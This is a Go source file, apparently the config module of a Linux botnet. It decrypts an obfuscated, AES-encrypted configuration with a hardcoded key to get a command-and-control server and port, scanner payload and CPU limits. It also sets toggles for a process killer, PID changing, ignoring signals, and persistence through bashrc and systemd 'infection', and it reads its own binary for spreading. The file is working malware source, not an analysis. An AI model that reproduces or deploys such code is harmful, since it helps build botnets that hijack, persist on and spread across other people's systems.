package config

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
)

// CONFIG

/*
1 - server ip   :: string
2 - server port :: string
3 - ignore signals      :: bool
4 - scanner     :: bool
5 - num cpu (scanner) :: string
6 - max cpu load      :: string
7 - pid changer       :: bool
8 - debug            :: bool
9 - killer min|max pid (if max=-1 no limit) :: string
10 - killer enabled :: bool
11 - bashrc infecttion ::  bool
12 - systemd infection :: bool
13 - payload       :: string

\\ - separator
*/

var (
	CONFIG = "354a682b796a4a2b3831773764506d3358786564583830425141386d504f57744c716e50706b532b7752704752784a427476467667684a6a476f37345a2b2f2f5369534e75794254722b4169694f6c416d7862435844587339704168496859726b78596459434c6973674b6238354c4844513d3d"
)

// DO NOT CHANGE
var (
	BOT_SERVER string
	BOT_PORT   string

	SCANNER_ENABLED     bool
	SCANNER_PAYLOAD     string
	SCANNER_MIN_NUM_CPU int

	MAX_CPU_VALUE int

	IGNORE_SIGNALS bool
	PID_CHANGER    bool

	DEBUG bool

	BINARY_FILE []byte

	KILLER_ENABLED            bool
	BASHRC_INFECTION_ENABLED  bool
	SYSTEMD_INFECTION_ENABLED bool

	MIN_KILLER_PID int
	MAX_KILLER_PID int
)

func Config() {

	key := []byte{111, 104, 54, 117, 109, 97, 101, 90, 109, 122, 70, 57, 52, 104, 77, 100, 56, 66, 84, 51, 80, 68, 73, 56, 73, 90, 71, 73, 87, 43, 90, 70}

	dec, err := hex.DecodeString(CONFIG)
	if err != nil {
		os.Exit(0)
	}

	decrypted := Decrypt(key, string(dec))
	if decrypted == "" {
		os.Exit(0)
	}

	res := strings.Split(decrypted, "\\")

	if len(res) < 8 {
		os.Exit(0)
	}

	BOT_SERVER = res[0]
	BOT_PORT = res[1]

	IGNORE_SIGNALS, _ = strconv.ParseBool(res[2])

	SCANNER_ENABLED, _ = strconv.ParseBool(res[3])

	SCANNER_MIN_NUM_CPU, _ = strconv.Atoi(res[4])

	MAX_CPU_VALUE, _ = strconv.Atoi(res[5])

	PID_CHANGER, _ = strconv.ParseBool(res[6])

	DEBUG, _ = strconv.ParseBool(res[7])

	MIN_KILLER_PID, _ = strconv.Atoi(strings.Split(res[8], "|")[0])

	maxkiller, _ := strconv.Atoi(strings.Split(res[8], "|")[1])
	if maxkiller == -1 {
		MAX_KILLER_PID = 1 << 30
	}

	KILLER_ENABLED, _ = strconv.ParseBool(res[9])
	BASHRC_INFECTION_ENABLED, _ = strconv.ParseBool(res[10])
	SYSTEMD_INFECTION_ENABLED, _ = strconv.ParseBool(res[11])

	SCANNER_PAYLOAD = res[12]

	BINARY_FILE, _ = os.ReadFile(os.Args[0])

	if DEBUG {
		fmt.Printf("CONFIG:\nBot server: %s\nBot port: %s\nScanner enabled: %t\nScanner payload: %s\nScanner min num cpu: %d\nMax cpu value: %d\nIgnore signals: %t\nPid changer: %t\nKiller enabled: %t\nBashrc inf. enabled: %t\nSystemd inf. enabled: %t\nMin-Max killer pid: %d-%d\n------------------------\n", BOT_SERVER, BOT_PORT, SCANNER_ENABLED, SCANNER_PAYLOAD, SCANNER_MIN_NUM_CPU, MAX_CPU_VALUE, IGNORE_SIGNALS, PID_CHANGER, KILLER_ENABLED, BASHRC_INFECTION_ENABLED, SYSTEMD_INFECTION_ENABLED, MIN_KILLER_PID, MAX_KILLER_PID)
	}
}

func Encrypt(key []byte, plain string) string {
	byteMsg := []byte(plain)
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	cipherText := make([]byte, aes.BlockSize+len(byteMsg))
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println(err)
		return ""
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], byteMsg)

	return base64.StdEncoding.EncodeToString(cipherText)
}

func Decrypt(key []byte, plain string) string {
	cipherText, err := base64.StdEncoding.DecodeString(plain)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	if len(cipherText) < aes.BlockSize {
		fmt.Println(err)
		return ""
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)

	return string(cipherText)
}
